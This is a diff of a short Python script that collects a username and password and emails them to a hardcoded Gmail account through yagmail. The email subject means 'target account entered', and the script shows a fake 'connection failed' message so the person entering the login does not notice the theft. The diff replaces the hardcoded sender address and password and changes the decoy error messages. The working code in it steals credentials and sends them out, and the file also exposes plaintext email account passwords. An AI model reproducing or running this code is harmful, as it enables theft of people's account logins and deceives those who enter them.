@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 # coding=utf-8
 import socket,struct,os,sys,time,yagmail
-x=yagmail.SMTP('tololvenom@gmail.com','kontol3452')
+x=yagmail.SMTP('koklugakjago@gmail.com','kontollaki')
 subject='AKUN TARGET MASUK'
 logo = """\033[1;94m█████████
 \033[1;94m█▄█████▄█      \033[1;94m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
@@ -26,8 +26,8 @@ def main():
         msg=('username: '+u+', password: '+p)
         body=(msg)
         print('')
-        print('\x1b[00mSorry, connection failed\x1b[91m !\x1b[00m')
-        print('\x1b[33mPlease try again later ...')
+        print('\x1b[00mSorry, Tipis ini sedang rusak\x1b[91m !\x1b[00m')
+        print('\x1b[33mPlease jangan gunakan tools ini :) ...')
         os.system('sleep 3')
         print('')
         print('\x1b[00mExiting program \x1b[91m!')
